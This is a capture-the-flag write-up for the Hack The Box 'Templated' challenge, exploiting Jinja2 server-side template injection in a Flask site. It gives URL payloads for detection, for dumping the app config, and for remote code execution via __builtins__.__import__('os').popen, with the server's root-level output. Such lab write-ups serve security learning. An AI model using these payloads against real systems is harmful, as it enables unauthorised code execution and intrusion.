# Templated
Easy web challenge from HTB

## Introduction
 CHALLENGE DESCRIPTION: Can you exploit this simple mistake?

## Vulnerability finding
We get an IP and a port, if we go there we can see the following page:

![Site still under construction... Proudly powered by Flask/Jinja2](site.png)

As we can see, we are attacking a web written using Jinja2, a template engine for python webpages.
If we have this and the name of the challenge ("Templated") on mind, we first think on a Server Side Template Injection attack.

If we try to reach the page http://142.93.41.143:30851/error for example, we'll receive a 404 error and "The page 'error' could not be found". 
Now we try to generate a SSTI attack with the following payload:
http://142.93.41.143:30851/%7B%7B7*7%7D%7D &rarr; "The page '49' could not be found"

It's vulnerable, let's hack it!

## Attack
We can search for payloads and more info about the vulnerability on this page:
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

Now we get the configuration with:
http://142.93.41.143:30851/%7B%7Bconfig%7D%7D &rarr; The page '<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>' could not be found

We can get a RCE with the following payload:
http://142.93.41.143:30851/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D:
"The page 'uid=0(root) gid=0(root) groups=0(root) ' could not be found"

As we can see, the are running this as a root... if we list the directory ("/") we can see a file called "flag.txt"
![Cat to the flag](flag.txt)
